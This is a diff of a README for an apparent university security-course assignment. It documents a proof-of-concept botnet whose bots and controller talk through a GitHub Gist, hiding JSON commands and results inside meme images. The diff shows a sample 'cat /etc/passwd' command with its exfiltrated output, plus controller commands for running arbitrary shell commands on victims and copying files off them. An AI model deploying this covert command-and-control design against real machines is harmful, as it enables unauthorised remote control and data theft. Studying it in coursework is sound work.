@@ -15,6 +15,9 @@ the final Stage 5 of the Bonus Assignment from the [CTU FEE][ctu-fee] ([ČVUT FE
 - [Background](#background)
 - [Features](#features)
 - [Implementation](#implementation)
+	- [Communication protocol](#communication-protocol)
+	- [Controlling the controller](#controlling-the-controller)
+	- [Controlling the bot](#controlling-the-bot)
 - [Usage](#usage)
 	- [Controller](#controller)
 	- [Bot](#bot)
@@ -59,6 +62,9 @@ See the [instructions.txt](./instructions.txt) for the details.
 _Note: The implementation is more of a proof of a concept or demo. There are a lot of possible edge cases that we would
 like to handle in real code._
 
+
+### Communication protocol
+
 The communication mechanism supports multiple bots (running on victims' machines) and one controller that is running on
 the attacker's machine. Note that the controller does not have to be running all the time in order for the bots to be
 working.
@@ -78,8 +84,133 @@ to the controller and to any bot via arguments (see [Usage](#usage) section).
 Both the controller and the bots periodically (currently the period is set to 30 seconds) pull the latest changes from
 the communication's Gist using `git`.
 
-TODO finish description of the implementation
+Each bot upon its startup generates a random name that consists of two parts:
+1. a random prefix (0-9999)
+2. the name of a random image (except the control image security.jpg) from [the memes library][images-lib-gist]
 
+The bot it _registers_ by creating a new image with its name (for example `7273-netcat.jpg`) as a copy of the chosen
+image (`netcat.jpg`) but with an added hidden `state.json` file:
+```json
+{
+	"last_update": 1673429102058,
+	"result": null
+}
+```
+
+Then the bot periodically updates the `last_update` to the current date.
+Using the `last_update`, the controller can then detect which bots are alive. When the difference between the
+controller's current date and a bot's `last_update` exceeds the `KEEP_ALIVE_TIMEOUT` (currently set to 90 seconds),
+the controller assumes that bot is no longer running (it has been ungracefully stopped, it crashed, etc.) and it deletes
+the corresponding image from the communication gist. In case that the bot in fact comes back online, it will detect the
+deleted image and re-register by creating a new random name.
+
+If the bots is terminated gracefully (either via the `terminate` command or manually by pressing `Ctr-C`), it deletes
+its own image (and push the changes to the gist).
+
+The controller sends commands to bots via a copy of the control image [security.jpg](./template/security.jpg)
+which contains a hidden `state.json` file. The `state.json` file contains a map (dictionary) that specifies a command
+for each bot. For example:
+```json
+{
+	"7273-netcat.jpg": null,
+	"8142-joy.png": {
+		"id": "dceaedc887cad72afda01a10dfc266f3",
+		"timestamp": 1673429151267,
+		"name": "run",
+		"shell": false,
+		"cmd": "cat /etc/passwd"
+	}
+}
+```
+
+Every bot checks periodically **the control image** to see if there is a new command (every command has a unique
+16-bytes `id`). If it detects a new command, it executes it, and then sends the result back to the controller using its
+own status image (e.g., `8142-joy.png`) with a hidden a `state.json` file:
+```json
+{
+	"last_update": 1673429162944,
+	"result": {
+		"id": "dceaedc887cad72afda01a10dfc266f3",
+		"timestamp": 1673429162944,
+		"exit_code": 0,
+		"stdout": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nredis:x:101:101::/var/lib/redis:/usr/sbin/nologin\nsystemd-timesync:x:102:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\nsystemd-network:x:103:104:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:104:105:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:105:106::/nonexistent:/usr/sbin/nologin\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\ntcpdump:x:107:108::/nonexistent:/usr/sbin/nologin\nsyslog:x:108:109::/home/syslog:/usr/sbin/nologin\npostfix:x:109:112::/var/spool/postfix:/usr/sbin/nologin\nlogcheck:x:110:114:logcheck system account,,,:/var/lib/logcheck:/usr/sbin/nologin\nDebian-exim:x:111:115::/var/spool/exim4:/usr/sbin/nologin\ncowrie:x:1000:1000:,,,:/home/cowrie:/bin/bash\n",
+		"stderr": ""
+	}
+}
+```
+
+Every time the controller pulls the latest changes, it inspects each image (except the control image) and extracts the
+corresponding bot's data. If `result.id` equals to the pending command id for that bot, it prints the result and clears
+the pending command:
+```json
+{
+	"7273-netcat.jpg": null,
+	"8142-joy.png": null
+}
+```
+
+Next time, the **7273-netcat.jpg** bot pull the latest changes, it sees that there is no command for it and in turn it
+updates its state to:
+```json
+{
+	"last_update": 1673429385919,
+	"result": null
+}
+```
+
+
+### Controlling the controller
+
+The controller has a built-in REPL (Read–Eval–Print Loop) that allows the user to enter one of the supported commands.
+Currently, it does not support history and arrow navigation.
+Note that the REPL does not block the periodical updates.
+
+In oder to see all available commands together with their short description, the user can use `help` or `?` commands.
+Below you can see all the available commands (the output of the `help` command). Refer to the [Features](#features)
+section to see colored output.
+```text
+Auto update in 30 seconds. Press enter to force update.
+Press Ctrl-C to stop.
+Enter a command. Use ? or help to show help.
+> help
+
+AVAILABLE COMMANDS:
+
+? or help
+  Prints this help.
+bots
+  Lists all bots and their status.
+terminate <bot>
+  Terminates the bot.
+shell <bot> <command>
+  Runs the given command on the bot using the following Python code.
+    subprocess.run(args=[<command>], shell=True)
+  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.
+  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.
+run <bot> <command>
+  Runs the given command on the bot using the following Python code.
+    subprocess.run(args=shlex.split(<command>), shell=False)
+  Note: <command> might contain spaces. Even the leading/trailing spaces are preserved.
+  See https://docs.python.org/3.8/library/subprocess.html#subprocess.run.
+copyFrom <bot> <file name>
+  Copies the file from the bot to the controller's workdir.
+do <bot> id
+  Alias for shell <bot> id
+do <bot> who
+  Alias for shell <bot> who
+do <bot> ls <path>
+  Alias for shell <bot> ls -lha <path>
+```
+
+
+### Controlling the bot
+
+The bot can be controlled remotely from the controller. Locally (useful especially during the development), it supports
+the following interaction:
+```text
+Auto update in 30 seconds. Press enter to force update.
+Press Ctrl-C to unregister and terminate.
+```
 
 ## Usage
 
@@ -104,7 +235,7 @@ Start the controller by running and providing at least `workdir`, `gist` and `to
 python3 controller.py workdir gist token
 ```
 
-For a demo values of `gist` and `token` arguments, refer to Stage 5 description
+For demo values of `gist` and `token` arguments, refer to the Stage 5 description
 in [Martin Endler BSY 2022/2023 Bonus Assignment report][report] (note: the report is shared only with the BSY course's
 teachers).
 
@@ -132,7 +263,7 @@ the `gist` and `token` arguments:
 python3 src/controller.py data/controller gist token
 ```
 
-For a demo values of `gist` and `token` arguments, refer to Stage 5 description
+For demo values of `gist` and `token` arguments, refer to Stage 5 description
 in [Martin Endler BSY 2022/2023 Bonus Assignment report][report] (note: the report is shared only with the BSY course's
 teachers).
 
@@ -147,7 +278,7 @@ Start the bot by running and providing at least `workdir`, `gist` and `token` po
 python3 bot.py workdir gist token
 ```
 
-For a demo values of `gist` and `token` arguments, refer to Stage 5 description
+For demo values of `gist` and `token` arguments, refer to Stage 5 description
 in [Martin Endler BSY 2022/2023 Bonus Assignment report][report] (note: the report is shared only with the BSY course's
 teachers).
 
